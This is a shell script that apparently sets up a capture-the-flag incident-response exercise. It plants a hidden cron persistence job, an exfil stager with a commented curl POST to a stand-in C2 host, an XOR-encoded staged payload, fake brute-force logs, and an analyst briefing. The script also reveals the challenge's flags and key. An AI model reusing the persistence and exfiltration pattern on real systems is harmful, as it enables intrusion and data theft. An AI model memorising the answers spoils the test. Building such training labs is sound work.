#!/bin/bash
#
# Stadium FC — incident scene primer.
# Plants attacker artifacts with dynamic flags, then starts sshd.
#
set -e

rand() { head -c 8 /dev/urandom | od -An -tx1 | tr -d ' \n'; }

FLAG1="${FLAG1:-INFODAYS{SaamNoLimits_persistence_unearthed_$(rand)}}"
FLAG2="${FLAG2:-INFODAYS{SaamNoLimits_exfil_recovered_$(rand)}}"
XOR_KEY="${XOR_KEY:-stadiumfc2026}"

# ----- SSH host keys -----
ssh-keygen -A >/dev/null 2>&1 || true

# ----- directories the attacker "left behind" -----
mkdir -p /opt/stadium/.cache /var/tmp/.stage /var/log /etc/cron.d
chmod 755 /opt/stadium /opt/stadium/.cache /var/tmp/.stage /etc/cron.d

# ----- malicious cron (hidden via dot-prefix) -----
cat > /etc/cron.d/.sysupdate <<EOF
# stadium analytics auto-installed 2026-03-12 by ops@stadiumfc.example
# [DO NOT REMOVE] — required by metrics pipeline
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
*/5 * * * * root /opt/stadium/.cache/daemon.sh >/dev/null 2>&1
EOF
chmod 644 /etc/cron.d/.sysupdate

# ----- decoy cron (not malicious) -----
cat > /etc/cron.d/stadium-metrics <<'EOF'
# stadium uptime sampler — added by devops 2026-01-08
*/15 * * * * root /usr/bin/uptime >> /var/log/metrics.log 2>&1
EOF
chmod 644 /etc/cron.d/stadium-metrics

# ----- malicious stager script (contains F1 + XOR key) -----
cat > /opt/stadium/.cache/daemon.sh <<EOF
#!/bin/bash
# stadium metrics stager
# audit_token: ${FLAG1}
#
# NOTE: this is the attacker's exfil stager. It reads a pre-staged,
# base64+xor-encoded blob from PAYLOAD and POSTs it to C2. C2 is
# currently unreachable from this jump box (egress was cut after
# the incident was noticed).

KEY="${XOR_KEY}"
PAYLOAD="/var/tmp/.stage/payload"

# cat "\$PAYLOAD" | curl -s -X POST --data-binary @- https://c2.stadium-ops.example/drop
EOF
chmod 755 /opt/stadium/.cache/daemon.sh

# ----- staged payload: base64( xor(F2 + context, KEY) ) -----
python3 - <<PY
import base64
key = b"${XOR_KEY}"
plaintext = b"DATAVAULT_DROP header=stadiumfc-ops\n" + b"${FLAG2}" + b"\nEOF\n"
xored = bytes(c ^ key[i % len(key)] for i, c in enumerate(plaintext))
with open("/var/tmp/.stage/payload", "wb") as f:
    f.write(base64.b64encode(xored))
PY
chmod 644 /var/tmp/.stage/payload

# ----- auth.log scene-setting (brute-force + successful root login) -----
cat > /var/log/auth.log <<'EOF'
Mar 12 03:41:12 stadium-ops sshd[1204]: Failed password for root from 185.196.8.23 port 61218 ssh2
Mar 12 03:41:15 stadium-ops sshd[1204]: Failed password for root from 185.196.8.23 port 61220 ssh2
Mar 12 03:41:17 stadium-ops sshd[1204]: Failed password for root from 185.196.8.23 port 61222 ssh2
Mar 12 03:41:19 stadium-ops sshd[1204]: Failed password for root from 185.196.8.23 port 61224 ssh2
Mar 12 03:41:22 stadium-ops sshd[1204]: Failed password for root from 185.196.8.23 port 61226 ssh2
Mar 12 03:41:24 stadium-ops sshd[1208]: Accepted password for root from 185.196.8.23 port 61230 ssh2
Mar 12 03:41:24 stadium-ops sshd[1208]: pam_unix(sshd:session): session opened for user root(uid=0)
Mar 12 03:41:33 stadium-ops sudo[1244]: root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/mkdir -p /opt/stadium/.cache
Mar 12 03:41:41 stadium-ops sudo[1247]: root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/install -m 0755 /tmp/d /opt/stadium/.cache/daemon.sh
Mar 12 03:42:03 stadium-ops sudo[1251]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -e
Mar 12 03:42:18 stadium-ops sshd[1208]: pam_unix(sshd:session): session closed for user root
EOF
chmod 644 /var/log/auth.log

# Write a decoy metrics log so /var/log doesn't look empty.
echo " 03:40:01 up 12 days, load: 0.12 0.08 0.05" > /var/log/metrics.log
chmod 644 /var/log/metrics.log

# ----- analyst briefing -----
cat > /home/analyst/BRIEFING.md <<'EOF'
# Stadium FC — Incident Briefing

You are an IR analyst called in at 06:00. At ~03:41 last night, our
Stadium FC ops jump box (this host) was compromised via a stolen root
password. By 03:42 the attacker logged off and the intrusion went
unnoticed until the morning stand-up.

Your two tasks (in order):

  F1. Identify and recover the attacker's **persistence mechanism**.
      We believe they installed a cron-based stager somewhere outside
      the usual paths. The attacker's tooling embeds an audit token
      (their operator tag). We need that token.

  F2. Recover the **staged exfil payload**. We think a blob was
      prepared on disk but was never shipped out (egress was cut in
      time). Decode it and report what it contained.

Rules of engagement:

  - You are logged in as `analyst` (uid 1000). You have NO sudo.
  - Everything the attacker left on disk is reachable with your
    current privileges — they were sloppy with permissions.
  - Standard Linux forensics tools are installed: grep, find, xxd,
    file, base64, python3, less, nano, vim-tiny.
  - Egress is blocked. You cannot reach the C2.

Flags are of the form `INFODAYS{...}`. Good hunting.
EOF

chown -R analyst:analyst /home/analyst
chmod 644 /home/analyst/BRIEFING.md

echo "[*] incident scene primed."
echo "[*] starting sshd on :22 (user: analyst / pass: analyst123)"
exec /usr/sbin/sshd -D -e
